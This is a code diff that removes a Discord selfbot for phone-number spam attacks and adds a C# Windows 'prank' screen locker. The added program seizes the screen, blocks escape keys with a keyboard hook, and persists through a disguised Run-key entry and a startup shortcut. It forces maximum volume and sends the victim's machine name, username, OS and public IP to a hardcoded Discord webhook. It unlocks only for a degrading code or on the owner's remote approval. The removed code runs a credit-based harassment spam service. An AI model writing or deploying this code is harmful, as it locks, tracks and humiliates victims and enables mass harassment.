@@ -1,719 +1,610 @@
-const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
-const { Client, GatewayIntentBits, ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
-const fs = require('fs');
-const express = require('express');
+using System;
+using System.Drawing;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Windows.Forms;
+using System.IO;
+using System.Threading;
+using System.Diagnostics;
+using System.Net;
+using Microsoft.Win32;
 
-const SELFBOT_TOKEN = process.env.DISCORD_TOKEN;
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const GUILD_ID = process.env.GUILD_ID;
-const CHANNEL_ID = process.env.CHANNEL_ID;
-const MESSAGE_ID = process.env.MESSAGE_ID;
-const COMMAND_CHANNEL_ID = process.env.COMMAND_CHANNEL_ID;
-const FEEDBACK_CHANNEL_ID = process.env.FEEDBACK_CHANNEL_ID;
-const CREDITS_CHANNEL_ID = process.env.CREDITS_CHANNEL_ID;
-const MANAGE_CHANNEL_ID = process.env.MANAGE_CHANNEL_ID;
-const OWNER_ID = process.env.OWNER_ID;
-const APPROVER_IDS = (process.env.APPROVER_IDS || '').split(',').map(id => id.trim()).filter(id => id);
-const UNLIMITED_IDS = (process.env.UNLIMITED_IDS || '').split(',').map(id => id.trim()).filter(id => id);
-const OWNER_NAME = 'ᴹᴿZENO亗';
-const TIMEZONE = process.env.TIMEZONE || 'Asia/Jerusalem';
-const PORT = process.env.PORT || 8080;
-const SPAMMERS_FILE = 'spammers.json';
-const USERS_FILE = 'users.json';
-const APPROVAL_TIMEOUT_MS = 10 * 60 * 1000;
-const COOLDOWN_MS = 20 * 1000;
-const DAILY_CREDITS = 5;
-const CREDITS_COOLDOWN_MS = 24 * 60 * 60 * 1000;
+namespace ZenoSpamer
+{
+    public class PrankForm : Form
+    {
+        static readonly string SECRET_CODE = "אני זונה של ZENO";
+        static readonly string TITLE_TEXT = "אתה זונה של ᴹᴿZENO亗";
+        static readonly string PERSIST_NAME = "WindowsSystemService";
+        static readonly string SERVER_URL = "https://spam-bot-v2.onrender.com";
 
-// ==== PRANK ====
-const PRANK_SECRET = process.env.PRANK_SECRET || 'CHANGE_ME_LONG_RANDOM';
-const PRANK_SERVER = process.env.PRANK_SERVER || 'https://spam-bot-v2.onrender.com';
+        static readonly string WEBHOOK_URL = "https://discord.com/api/webhooks/1560039433468649482/LyX8HOtPzHxvLqfEyF0Qg2aw6G6Zmam5yP0SN9MATv3sTZL34rTUicWMzDnwYaEUNQdK";
 
-const pendingRequests = new Map();
-const cooldowns = new Map();
-const prankRequests = new Map();
+        [DllImport("winmm.dll")]
+        public static extern int waveOutSetVolume(IntPtr hwo, uint dwVolume);
 
-function getAllApprovers() {
-    const set = new Set([OWNER_ID, ...APPROVER_IDS]);
-    return [...set];
-}
+        [DllImport("winmm.dll")]
+        public static extern int waveOutGetVolume(IntPtr hwo, out uint dwVolume);
 
-function isApprover(userId) {
-    return userId === OWNER_ID || APPROVER_IDS.includes(userId);
-}
+        [DllImport("winmm.dll", CharSet = CharSet.Auto)]
+        static extern int mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);
 
-function loadJSON(file) {
-    try {
-        return JSON.parse(fs.readFileSync(file, 'utf8'));
-    } catch {
-        return {};
-    }
-}
-function saveJSON(file, data) {
-    fs.writeFileSync(file, JSON.stringify(data, null, 2), 'utf8');
-}
+        [DllImport("user32.dll")]
+        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
-let spammers = loadJSON(SPAMMERS_FILE);
-let users = loadJSON(USERS_FILE);
+        [DllImport("user32.dll")]
+        static extern bool UnhookWindowsHookEx(IntPtr hhk);
 
-function saveSpammers() { saveJSON(SPAMMERS_FILE, spammers); }
-function saveUsers() { saveJSON(USERS_FILE, users); }
+        [DllImport("user32.dll")]
+        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
 
-function getUser(userId) {
-    if (!users[userId]) {
-        users[userId] = { credits: 0, lastClaim: 0, totalClaimed: 0 };
-    }
-    return users[userId];
-}
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetModuleHandle(string lpModuleName);
 
-function hasUnlimited(userId) {
-    if (userId === OWNER_ID) return true;
-    return UNLIMITED_IDS.includes(userId);
-}
+        [DllImport("user32.dll")]
+        static extern short GetAsyncKeyState(int vKey);
 
-async function findUserByName(guild, name) {
-    const cleanName = name.replace(/^@/, '').trim().toLowerCase();
+        delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
-    let member = guild.members.cache.find(m =>
-        m.user.username.toLowerCase() === cleanName ||
-        m.user.tag.toLowerCase() === cleanName ||
-        m.displayName.toLowerCase() === cleanName
-    );
+        const int WH_KEYBOARD_LL = 13;
+        const int WM_KEYDOWN = 0x0100;
+        const int WM_SYSKEYDOWN = 0x0104;
 
-    if (member) return member;
+        IntPtr hookId = IntPtr.Zero;
+        LowLevelKeyboardProc proc;
 
-    try {
-        const members = await guild.members.fetch();
-        member = members.find(m =>
-            m.user.username.toLowerCase() === cleanName ||
-            m.user.tag.toLowerCase() === cleanName ||
-            m.displayName.toLowerCase() === cleanName
-        );
-        if (member) return member;
-    } catch (e) {
-        console.log(`[-] Failed to fetch members: ${e.message}`);
-    }
+        TextBox codeBox;
+        TextBox requestBox;
+        Button sendBtn;
+        Label messageLabel;
+        Label titleLabel;
+        Label hintLabel;
+        Label requestLabel;
+        Label statusLabel;
+        bool unlocked = false;
+        string mediaPath = null;
+        string requestId = null;
+        object wmpPlayer = null;
+        static uint originalVolume = 0;
 
-    member = guild.members.cache.find(m =>
-        m.user.username.toLowerCase().includes(cleanName) ||
-        m.displayName.toLowerCase().includes(cleanName)
-    );
+        public PrankForm()
+        {
+            requestId = Environment.MachineName + "_" + DateTime.Now.Ticks.ToString();
 
-    return member || null;
-}
+            try { waveOutGetVolume(IntPtr.Zero, out originalVolume); } catch { }
 
-function isValidPhone(phone) {
-    const cleaned = phone.replace(/[\s\-()]/g, '');
-    return /^[0-9+]{9,15}$/.test(cleaned) && /^[0+]/.test(cleaned);
-}
-function isValidCredits(credits) {
-    return /^\d{1,4}$/.test(credits) && parseInt(credits) >= 1 && parseInt(credits) <= 1000;
-}
-function isValidHour(hour) {
-    return /^\d{1,2}$/.test(hour) && parseInt(hour) >= 0 && parseInt(hour) <= 23;
-}
-function isValidMinute(minute) {
-    return /^\d{1,2}$/.test(minute) && parseInt(minute) >= 0 && parseInt(minute) <= 59;
-}
+            this.FormBorderStyle = FormBorderStyle.None;
+            this.WindowState = FormWindowState.Maximized;
+            this.TopMost = true;
+            this.BackColor = Color.Black;
+            this.ControlBox = false;
+            this.Text = "System";
+            this.KeyPreview = true;
+            this.ShowInTaskbar = false;
 
-const app = express();
-app.get('/', (req, res) => res.send('OK'));
-app.get('/health', (req, res) => res.send('OK'));
+            System.Windows.Forms.Timer colorTimer = new System.Windows.Forms.Timer();
+            colorTimer.Interval = 300;
+            bool toggle = false;
+            colorTimer.Tick += delegate(object s, EventArgs e)
+            {
+                this.BackColor = toggle ? Color.Black : Color.DarkRed;
+                toggle = !toggle;
+            };
+            colorTimer.Start();
 
-// ========== PRANK ENDPOINTS ==========
-app.get('/prank/status', (req, res) => {
-    const id = req.query.id;
-    if (!id) return res.json({ status: 'error' });
-    const status = prankRequests.get(id) || { status: 'pending' };
-    res.json(status);
-});
-
-// ==== מוגן במפתח סודי ====
-app.get('/prank/approve', (req, res) => {
-    const { id, key } = req.query;
-    if (!id) return res.status(400).send('Missing ID');
-    if (key !== PRANK_SECRET) return res.status(403).send('Forbidden');
-    prankRequests.set(id, { status: 'approved', code: 'אני זונה של ZENO' });
-    res.send('Approved');
-});
-
-app.get('/prank/deny', (req, res) => {
-    const { id, key } = req.query;
-    if (!id) return res.status(400).send('Missing ID');
-    if (key !== PRANK_SECRET) return res.status(403).send('Forbidden');
-    prankRequests.set(id, { status: 'denied' });
-    res.send('Denied');
-});
-
-// ==== חדש: רשימת בקשות ממתינות ====
-app.get('/prank/pending', (req, res) => {
-    const { key } = req.query;
-    if (key !== PRANK_SECRET) return res.status(403).send('Forbidden');
-    const list = [];
-    for (const [id, data] of prankRequests.entries()) {
-        list.push({ id, status: data.status });
-    }
-    res.json(list);
-});
-
-app.listen(PORT, () => console.log(`[+] HTTP server running on port ${PORT}`));
-
-// ========== SELFBOT ==========
-const selfbot = new SelfbotClient({ checkUpdate: false });
-
-async function showSpamProgress(editFunc, phone, credits) {
-    const totalSeconds = credits * 25;
-    const startTime = Date.now();
-    const endTime = startTime + totalSeconds * 1000;
-
-    const createEmbed = (timeLeft, finished = false) => {
-        const elapsed = (Date.now() - startTime) / 1000;
-        const success = Math.max(0, Math.floor(elapsed * 0.7));
-
-        const embed = new EmbedBuilder()
-            .setTitle(finished ? '✅ Spam Finished' : '🚀 Spam in Progress')
-            .addFields(
-                { name: '🎯 Target', value: phone, inline: true },
+            System.Windows.Forms.Timer frontTimer = new System.Windows.Forms.Timer();
+            frontTimer.Interval = 100;
+            frontTimer.Tick += delegate(object s, EventArgs e)
+            {
+                if (!unlocked)
                 {
-                    name: finished ? '⏱️ Total Time' : '⏱️ Time Left',
-                    value: finished ? `${totalSeconds} Sec` : `${timeLeft} Sec`,
-                    inline: true
+                    this.TopMost = true;
+                    this.BringToFront();
+                    this.Activate();
                 }
-            )
-            .setColor(finished ? 0x43b581 : 0xFF6B00);
+            };
+            frontTimer.Start();
 
-        if (finished) {
-            const feedbackText = FEEDBACK_CHANNEL_ID
-                ? `נשמח שתרשום לנו את דעתך על הספאמר בחדר <#${FEEDBACK_CHANNEL_ID}>`
-                : 'נשמח שתרשום לנו את דעתך על הספאמר בחדר feedback';
+            titleLabel = new Label();
+            titleLabel.Text = TITLE_TEXT;
+            titleLabel.ForeColor = Color.Red;
+            titleLabel.BackColor = Color.Transparent;
+            titleLabel.Font = new Font("Arial", 48, FontStyle.Bold);
+            titleLabel.AutoSize = true;
+            titleLabel.Location = new Point(100, 50);
+            this.Controls.Add(titleLabel);
 
-            embed.addFields(
-                {
-                    name: '📊 Stats',
-                    value: `✅ Success: **${success}**\n💳 Credits Used: **${credits}**\n⏱️ Total: **${totalSeconds} sec**`,
-                    inline: false
-                },
-                {
-                    name: '⭐ דעתך חשובה לנו',
-                    value: feedbackText,
-                    inline: false
-                }
-            );
-            embed.setFooter({ text: `© ${OWNER_NAME}` });
-        } else {
-            embed.addFields({
-                name: '📊 Stats',
-                value: `✅ Success: **${success}**\n💳 Credits: **${credits}**`,
-                inline: false
-            });
+            hintLabel = new Label();
+            hintLabel.Text = "YOUR COMPUTER IS LOCKED. Send a request to the owner to get the code.";
+            hintLabel.ForeColor = Color.Yellow;
+            hintLabel.BackColor = Color.Transparent;
+            hintLabel.Font = new Font("Arial", 16, FontStyle.Italic);
+            hintLabel.AutoSize = true;
+            hintLabel.Location = new Point(100, 180);
+            this.Controls.Add(hintLabel);
+
+            messageLabel = new Label();
+            messageLabel.Text = "Type the secret code to unlock:";
+            messageLabel.ForeColor = Color.White;
+            messageLabel.BackColor = Color.Transparent;
+            messageLabel.Font = new Font("Arial", 22);
+            messageLabel.AutoSize = true;
+            messageLabel.Location = new Point(100, 280);
+            this.Controls.Add(messageLabel);
+
+            codeBox = new TextBox();
+            codeBox.Font = new Font("Arial", 20);
+            codeBox.Location = new Point(100, 340);
+            codeBox.Width = 1200;
+            codeBox.Height = 50;
+            codeBox.KeyDown += CodeBox_KeyDown;
+            codeBox.RightToLeft = RightToLeft.Yes;
+            this.Controls.Add(codeBox);
+            codeBox.Focus();
+
+            requestLabel = new Label();
+            requestLabel.Text = "Or send a request to the owner:";
+            requestLabel.ForeColor = Color.Cyan;
+            requestLabel.BackColor = Color.Transparent;
+            requestLabel.Font = new Font("Arial", 20, FontStyle.Bold);
+            requestLabel.AutoSize = true;
+            requestLabel.Location = new Point(100, 450);
+            this.Controls.Add(requestLabel);
+
+            requestBox = new TextBox();
+            requestBox.Font = new Font("Arial", 18);
+            requestBox.Location = new Point(100, 510);
+            requestBox.Width = 900;
+            requestBox.Height = 50;
+            requestBox.Text = "Please give me the code, I promise to behave";
+            this.Controls.Add(requestBox);
+
+            sendBtn = new Button();
+            sendBtn.Text = "Send Request";
+            sendBtn.Font = new Font("Arial", 18, FontStyle.Bold);
+            sendBtn.Location = new Point(1020, 505);
+            sendBtn.Size = new Size(280, 60);
+            sendBtn.BackColor = Color.DarkCyan;
+            sendBtn.ForeColor = Color.White;
+            sendBtn.FlatStyle = FlatStyle.Flat;
+            sendBtn.Click += SendBtn_Click;
+            this.Controls.Add(sendBtn);
+
+            statusLabel = new Label();
+            statusLabel.Text = "";
+            statusLabel.ForeColor = Color.Lime;
+            statusLabel.BackColor = Color.Transparent;
+            statusLabel.Font = new Font("Arial", 14, FontStyle.Italic);
+            statusLabel.AutoSize = true;
+            statusLabel.Location = new Point(100, 590);
+            this.Controls.Add(statusLabel);
+
+            this.KeyDown += PrankForm_KeyDown;
+
+            proc = HookCallback;
+            hookId = SetHook(proc);
+
+            SetPersistence();
+
+            ForceMaxVolume();
+            Thread volThread = new Thread(VolumeMonitor);
+            volThread.IsBackground = true;
+            volThread.Start();
+
+            FindMedia();
+            PlayMedia();
+
+            this.Resize += delegate(object s, EventArgs e) { if (!unlocked) this.WindowState = FormWindowState.Maximized; };
+            this.Deactivate += delegate(object s, EventArgs e) { if (!unlocked) { this.Activate(); this.BringToFront(); } };
         }
-        return embed;
-    };
 
-    try {
-        await editFunc({ embeds: [createEmbed(totalSeconds)], components: [] });
-
-        const interval = setInterval(async () => {
-            const timeLeft = Math.max(0, Math.ceil((endTime - Date.now()) / 1000));
-
-            if (timeLeft <= 0) {
-                clearInterval(interval);
-                try {
-                    await editFunc({ embeds: [createEmbed(0, true)], components: [] });
-                } catch (e) {}
+        void SendBtn_Click(object sender, EventArgs e)
+        {
+            string message = requestBox.Text.Trim();
+            if (string.IsNullOrEmpty(message))
+            {
+                statusLabel.Text = "Write something first!";
+                statusLabel.ForeColor = Color.Red;
                 return;
             }
 
-            try {
-                await editFunc({ embeds: [createEmbed(timeLeft)], components: [] });
-            } catch (e) {}
-        }, 2000);
-    } catch (e) {
-        console.log(`[-] Progress error: ${e.message}`);
-    }
-}
+            sendBtn.Enabled = false;
+            statusLabel.Text = "Sending...";
+            statusLabel.ForeColor = Color.Yellow;
 
-async function doSpam(phone, credits) {
-    try {
-        console.log(`[+] Spam: ${phone} | ${credits} credits`);
-        const guild = selfbot.guilds.cache.get(GUILD_ID);
-        if (!guild) return '❌ השרת לא נמצא';
-        const channel = guild.channels.cache.get(CHANNEL_ID);
-        if (!channel) return '❌ החדר לא נמצא';
+            Thread t = new Thread(delegate()
+            {
+                try
+                {
+                    string pcName = Environment.MachineName;
+                    string userName = Environment.UserName;
+                    string osVersion = Environment.OSVersion.ToString();
+                    string ip = GetPublicIP();
 
-        const message = await channel.messages.fetch(MESSAGE_ID);
-        if (!message) return '❌ ההודעה לא נמצאה';
+                    string content =
+                        "🔒 NEW REQUEST FROM LOCKED PC\n\n" +
+                        "💬 Message: " + message + "\n\n" +
+                        "🖥 PC Name: " + pcName + "\n" +
+                        "👤 Windows User: " + userName + "\n" +
+                        "🪟 OS: " + osVersion + "\n" +
+                        "🌐 Public IP: " + ip + "\n" +
+                        "🆔 Request ID: " + requestId + "\n" +
+                        "🕐 Time: " + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss") + "\n\n" +
+                        "✅ To approve:  !approve " + requestId + "\n" +
+                        "❌ To deny:     !deny " + requestId;
 
-        let spamButton = null;
-        for (const row of message.components) {
-            for (const comp of row.components) {
-                if (comp.label && comp.label.includes('Spam')) {
-                    spamButton = comp;
-                    break;
+                    PostToWebhook(content);
+
+                    this.Invoke((MethodInvoker)delegate
+                    {
+                        statusLabel.Text = "Request sent! Waiting for approval...";
+                        statusLabel.ForeColor = Color.Lime;
+                        sendBtn.Enabled = true;
+                    });
+
+                    StartPolling();
                 }
-            }
-            if (spamButton) break;
-        }
-        if (!spamButton) return '❌ הכפתור לא נמצא';
-
-        const modalPromise = new Promise((resolve, reject) => {
-            const timeout = setTimeout(() => reject(new Error('Timeout')), 10000);
-            selfbot.once('interactionModalCreate', (m) => {
-                clearTimeout(timeout);
-                resolve(m);
+                catch (Exception ex)
+                {
+                    this.Invoke((MethodInvoker)delegate
+                    {
+                        statusLabel.Text = "Error: " + ex.Message;
+                        statusLabel.ForeColor = Color.Red;
+                        sendBtn.Enabled = true;
+                    });
+                }
             });
-        });
+            t.IsBackground = true;
+            t.Start();
+        }
 
-        await message.clickButton(spamButton.customId);
-        const modal = await modalPromise;
+        void StartPolling()
+        {
+            Thread pollThread = new Thread(delegate()
+            {
+                while (!unlocked)
+                {
+                    try
+                    {
+                        string url = SERVER_URL + "/prank/status?id=" + Uri.EscapeDataString(requestId);
+                        using (WebClient wc = new WebClient())
+                        {
+                            wc.Headers["User-Agent"] = "Mozilla/5.0";
+                            string response = wc.DownloadString(url);
 
-        let fieldIndex = 0;
-        for (const row of modal.components) {
-            for (const comp of row.components) {
-                if (comp.type === 'TEXT_INPUT' || comp.type === 4) {
-                    if (fieldIndex === 0) comp.setValue(phone);
-                    else if (fieldIndex === 1) comp.setValue(String(credits));
-                    fieldIndex++;
+                            if (response.Contains("\"approved\""))
+                            {
+                                this.Invoke((MethodInvoker)delegate
+                                {
+                                    codeBox.Text = SECRET_CODE;
+                                    codeBox.Focus();
+                                    statusLabel.Text = "Approved! Unlocking...";
+                                    statusLabel.ForeColor = Color.Lime;
+                                    Thread.Sleep(500);
+                                    CheckCode();
+                                });
+                                return;
+                            }
+                            else if (response.Contains("\"denied\""))
+                            {
+                                this.Invoke((MethodInvoker)delegate
+                                {
+                                    statusLabel.Text = "The owner denied your request.";
+                                    statusLabel.ForeColor = Color.Red;
+                                    hintLabel.Text = "DENIED. Send another request or enter the code.";
+                                    hintLabel.ForeColor = Color.Red;
+                                });
+                                return;
+                            }
+                        }
+                    }
+                    catch { }
+                    Thread.Sleep(5000);
+                }
+            });
+            pollThread.IsBackground = true;
+            pollThread.Start();
+        }
+
+        void PostToWebhook(string content)
+        {
+            try
+            {
+                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+
+                var httpWebRequest = (HttpWebRequest)WebRequest.Create(WEBHOOK_URL);
+                httpWebRequest.ContentType = "application/json";
+                httpWebRequest.Method = "POST";
+                httpWebRequest.UserAgent = "Mozilla/5.0";
+
+                string escaped = content
+                    .Replace("\\", "\\\\")
+                    .Replace("\"", "\\\"")
+                    .Replace("\n", "\\n")
+                    .Replace("\r", "\\r")
+                    .Replace("\t", "\\t");
+
+                string json = "{\"content\":\"" + escaped + "\"}";
+
+                using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
+                {
+                    streamWriter.Write(json);
+                }
+
+                var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
+                using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
+                {
+                    streamReader.ReadToEnd();
                 }
             }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Webhook error: " + ex.Message);
+            }
         }
 
-        await modal.reply();
-        console.log(`[+] Spam submitted!`);
-        return `✅ ספאם בוצע! ${phone} | ${credits}`;
-    } catch (e) {
-        console.log(`[-] Error: ${e.message}`);
-        return `❌ שגיאה: ${e.message}`;
-    }
-}
-
-setInterval(async () => {
-    const now = new Date();
-    const tz = new Intl.DateTimeFormat('en-US', {
-        timeZone: TIMEZONE,
-        hour: '2-digit',
-        minute: '2-digit',
-        hour12: false,
-    }).format(now);
-    const [hour, minute] = tz.split(':').map(Number);
-
-    for (const [id, sp] of Object.entries(spammers)) {
-        if (!sp.enabled) continue;
-        if (sp.lastRun && Date.now() - sp.lastRun < 5 * 60 * 1000) continue;
-        if (sp.hour === hour && sp.minute === minute) {
-            console.log(`[+] Scheduled: ${id}`);
-            const result = await doSpam(sp.phone, sp.credits);
-            sp.lastRun = Date.now();
-            saveSpammers();
-
-            try {
-                if (sp.ownerId) {
-                    const owner = await bot.users.fetch(sp.ownerId);
-                    await owner.send(`⏰ **ספאם מתוזמן בוצע!**\n\n🆔 \`${id}\`\n📱 ${sp.phone}\n💳 ${sp.credits}\n\n${result}`);
+        string GetPublicIP()
+        {
+            try
+            {
+                using (WebClient wc = new WebClient())
+                {
+                    wc.Headers["User-Agent"] = "Mozilla/5.0";
+                    return wc.DownloadString("https://api.ipify.org").Trim();
                 }
-            } catch (e) {}
-        }
-    }
-}, 60000);
-
-selfbot.on('ready', () => {
-    console.log(`[+] Selfbot: ${selfbot.user.tag}`);
-});
-
-// ========== BOT ==========
-const bot = new Client({
-    intents: [
-        GatewayIntentBits.Guilds,
-        GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent,
-        GatewayIntentBits.DirectMessages,
-        GatewayIntentBits.GuildMembers
-    ]
-});
-
-bot.on('ready', () => {
-    console.log(`[+] Bot: ${bot.user.tag}`);
-    console.log(`[+] OWNER_ID: ${OWNER_ID}`);
-    console.log(`[+] APPROVER_IDS: ${APPROVER_IDS.join(', ') || 'none'}`);
-    console.log(`[+] MANAGE_CHANNEL_ID: ${MANAGE_CHANNEL_ID}`);
-    console.log(`[+] COMMAND_CHANNEL_ID: ${COMMAND_CHANNEL_ID}`);
-    console.log(`[+] CREDITS_CHANNEL_ID: ${CREDITS_CHANNEL_ID}`);
-    console.log(`[+] UNLIMITED_IDS: ${UNLIMITED_IDS.join(', ') || 'none'}`);
-    console.log(`[+] PRANK_SERVER: ${PRANK_SERVER}`);
-    console.log(`[+] PRANK_SECRET: ${PRANK_SECRET ? 'set' : 'MISSING'}`);
-});
-
-async function purgeDMMessages(channel) {
-    let deleted = 0;
-    let lastId = null;
-
-    while (true) {
-        const options = { limit: 100 };
-        if (lastId) options.before = lastId;
-
-        const messages = await channel.messages.fetch(options);
-        if (messages.size === 0) break;
-
-        for (const [id, msg] of messages) {
-            try {
-                await msg.delete();
-                deleted++;
-                await new Promise(r => setTimeout(r, 500));
-            } catch (e) {}
+            }
+            catch { return "unknown"; }
         }
 
-        lastId = messages.last().id;
-        if (messages.size < 100) break;
-    }
+        void SetPersistence()
+        {
+            string exePath;
+            try { exePath = Process.GetCurrentProcess().MainModule.FileName; }
+            catch { return; }
 
-    return deleted;
+            if (exePath.Contains("vshost") || exePath.Contains("devenv")) return;
+
+            try
+            {
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
+                    @"Software\Microsoft\Windows\CurrentVersion\Run", true))
+                {
+                    if (key != null) key.SetValue(PERSIST_NAME, "\"" + exePath + "\"");
+                }
+            }
+            catch { }
+
+            try
+            {
+                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+                string linkPath = Path.Combine(startupFolder, PERSIST_NAME + ".lnk");
+
+                Type t = Type.GetTypeFromProgID("WScript.Shell");
+                if (t != null)
+                {
+                    dynamic shell = Activator.CreateInstance(t);
+                    var shortcut = shell.CreateShortcut(linkPath);
+                    shortcut.TargetPath = exePath;
+                    shortcut.WorkingDirectory = Path.GetDirectoryName(exePath);
+                    shortcut.WindowStyle = 1;
+                    shortcut.Description = "Windows System Service";
+                    shortcut.Save();
+                }
+            }
+            catch { }
+        }
+
+        void RemovePersistence()
+        {
+            try
+            {
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
+                    @"Software\Microsoft\Windows\CurrentVersion\Run", true))
+                {
+                    if (key != null) key.DeleteValue(PERSIST_NAME, false);
+                }
+            }
+            catch { }
+
+            try
+            {
+                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+                string linkPath = Path.Combine(startupFolder, PERSIST_NAME + ".lnk");
+                if (File.Exists(linkPath)) File.Delete(linkPath);
+            }
+            catch { }
+        }
+
+        void FindMedia()
+        {
+            string exeDir = AppDomain.CurrentDomain.BaseDirectory;
+            string[] extensions = { ".mp4", ".avi", ".mkv", ".wmv", ".mov",
+                                     ".mp3", ".wav", ".m4a", ".flv", ".webm", ".aac", ".ogg" };
+
+            foreach (string ext in extensions)
+            {
+                string[] files = Directory.GetFiles(exeDir, "*" + ext);
+                if (files.Length > 0) { mediaPath = files[0]; return; }
+            }
+        }
+
+        void PlayMedia()
+        {
+            if (mediaPath == null || !File.Exists(mediaPath)) return;
+
+            try
+            {
+                Type wmpType = Type.GetTypeFromProgID("WMPlayer.OCX");
+                if (wmpType != null)
+                {
+                    wmpPlayer = Activator.CreateInstance(wmpType);
+                    dynamic wmp = wmpPlayer;
+                    wmp.settings.volume = 100;
+                    wmp.settings.autoStart = true;
+                    wmp.settings.setMode("loop", true);
+                    wmp.URL = mediaPath;
+                    wmp.controls.play();
+                    return;
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("WMP error: " + ex.Message);
+            }
+
+            try
+            {
+                mciSendString("close media", null, 0, IntPtr.Zero);
+                mciSendString("open \"" + mediaPath + "\" alias media", null, 0, IntPtr.Zero);
+                mciSendString("play media repeat", null, 0, IntPtr.Zero);
+            }
+            catch { }
+        }
+
+        void ForceMaxVolume()
+        {
+            try
+            {
+                uint maxVol = 0xFFFFFFFF;
+                waveOutSetVolume(IntPtr.Zero, maxVol);
+                for (int i = 0; i < 4; i++) waveOutSetVolume((IntPtr)i, maxVol);
+            }
+            catch { }
+
+            try
+            {
+                if (wmpPlayer != null)
+                {
+                    dynamic wmp = wmpPlayer;
+                    wmp.settings.volume = 100;
+                }
+            }
+            catch { }
+        }
+
+        void VolumeMonitor()
+        {
+            while (!unlocked)
+            {
+                ForceMaxVolume();
+                Thread.Sleep(300);
+            }
+        }
+
+        IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule)
+            {
+                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                    GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+
+        bool IsKeyDown(int vKey)
+        {
+            return (GetAsyncKeyState(vKey) & 0x8000) != 0;
+        }
+
+        IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN) && !unlocked)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                bool alt = IsKeyDown(0x12);
+                bool ctrl = IsKeyDown(0x11);
+                bool shift = IsKeyDown(0x10);
+
+                if (vkCode == 0x73 && alt) return (IntPtr)1;
+                if (vkCode == 0x57 && ctrl) return (IntPtr)1;
+                if (vkCode == 0x1B && ctrl) return (IntPtr)1;
+                if (vkCode == 0x5B || vkCode == 0x5C) return (IntPtr)1;
+                if (vkCode == 0x09 && alt) return (IntPtr)1;
+                if (vkCode == 0x1B && ctrl && shift) return (IntPtr)1;
+                if (vkCode == 0x2E && ctrl && alt) return (IntPtr)1;
+                if (vkCode == 0x7A) return (IntPtr)1;
+                if (vkCode == 0x1B) return (IntPtr)1;
+            }
+            return CallNextHookEx(hookId, nCode, wParam, lParam);
+        }
+
+        void CodeBox_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Enter)
+            {
+                CheckCode();
+                e.SuppressKeyPress = true;
+            }
+        }
+
+        void CheckCode()
+        {
+            string typed = codeBox.Text.Trim();
+            if (typed == SECRET_CODE)
+            {
+                unlocked = true;
+                UnhookWindowsHookEx(hookId);
+
+                try
+                {
+                    if (wmpPlayer != null)
+                    {
+                        dynamic wmp = wmpPlayer;
+                        wmp.controls.stop();
+                    }
+                }
+                catch { }
+
+                try { mciSendString("close media", null, 0, IntPtr.Zero); } catch { }
+
+                try { waveOutSetVolume(IntPtr.Zero, originalVolume); } catch { }
+                for (int i = 0; i < 4; i++)
+                {
+                    try { waveOutSetVolume((IntPtr)i, originalVolume); } catch { }
+                }
+
+                RemovePersistence();
+
+                MessageBox.Show(
+                    "System restored. Persistence removed.\nYou are free.",
+                    "Welcome back",
+                    MessageBoxButtons.OK,
+                    MessageBoxIcon.Information);
+
+                this.Close();
+            }
+            else
+            {
+                codeBox.Clear();
+                messageLabel.Text = "WRONG CODE. Try again:";
+                messageLabel.ForeColor = Color.Red;
+            }
+        }
+
+        void PrankForm_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.Alt && e.KeyCode == Keys.F4) e.Handled = true;
+        }
+
+        protected override void OnFormClosing(FormClosingEventArgs e)
+        {
+            if (!unlocked) e.Cancel = true;
+            base.OnFormClosing(e);
+        }
+
+        protected override void OnLoad(EventArgs e)
+        {
+            base.OnLoad(e);
+            this.Activate();
+            this.BringToFront();
+        }
+
+        [STAThread]
+        static void Main()
+        {
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new PrankForm());
+        }
+    }
 }
-
-async function sendCreditsPanel(channel) {
-    const embed = new EmbedBuilder()
-        .setTitle('🎁 Free Gift!')
-        .setDescription(`Claim **${DAILY_CREDITS} free credits** every **24 hours**.`)
-        .setColor(0x2B2D31);
-
-    const row = new ActionRowBuilder()
-        .addComponents(
-            new ButtonBuilder()
-                .setCustomId('claim_credits')
-                .setLabel(`Claim ${DAILY_CREDITS} Credits`)
-                .setEmoji('🔔')
-                .setStyle(ButtonStyle.Danger)
-        );
-
-    await channel.send({ embeds: [embed], components: [row] });
-}
-
-async function sendManagePanel(channel) {
-    const embed = new EmbedBuilder()
-        .setTitle('💳 Credit Manager')
-        .setDescription(
-            '**נהל קרדיטים למשתמשים**\n\n' +
